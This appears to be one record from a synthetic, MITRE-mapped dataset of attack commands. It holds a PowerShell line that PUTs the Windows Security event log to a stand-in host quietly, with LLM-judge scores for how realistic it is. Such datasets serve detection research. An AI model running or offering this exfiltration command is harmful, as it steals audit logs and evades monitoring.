@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'https://collector.example.com/api/logs/security' -Method Put -InFile 'C:\\Windows\\System32\\winevt\\Logs\\Security.evtx' -ContentType 'application/octet-stream' -Headers @{ 'User-Agent'='Mozilla/5.0'; 'X-Session'=[guid]::NewGuid().ToString() } -ErrorAction SilentlyContinue",
+  "explanation": "Directly uploads the Security event log file using an HTTPS PUT request with minimal headers to blend in.",
+  "rationale_steps": [
+    "Target sensitive event log accessible to SYSTEM.",
+    "Use Invoke-WebRequest with PUT to transfer the file.",
+    "Attach generic headers and suppress output to stay quiet."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-ed594729-6eb3b0e6",
+  "source_prompt_hash": "ed594729",
+  "timestamp_utc": "2025-09-30T09:16:21.768830Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid PowerShell with balanced quotes/braces, correct Invoke-WebRequest parameters, and a properly formed headers hashtable.",
+        "semantic_score": 3,
+        "semantic_justification": "While it programmatically exfiltrates a file via HTTPS consistent with T1020, accessing Security.evtx generally requires elevated privileges and the file may be locked, so 'Privilege: None' is unrealistic and the upload may fail.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T02:06:32.139196Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper quoting, parameter names, method calls, and object construction syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command directly implements automated exfiltration by uploading the Windows Security event log file via HTTPS with custom headers to blend in with normal traffic, matching the T1020 technique perfectly.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:06:34.890001Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with correct cmdlet usage, parameter syntax, string literals, hash table construction, and expression evaluation.",
+        "semantic_score": 4,
+        "semantic_justification": "The command semantically aligns with T1020 Automated Exfiltration by using Invoke-WebRequest to upload a log file, but the specified 'Privilege: None' would prevent reading the Security.evtx file due to access restrictions and file locking, creating an operational realism gap.",
+        "combined_score": 4.5,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:06:47.960043Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
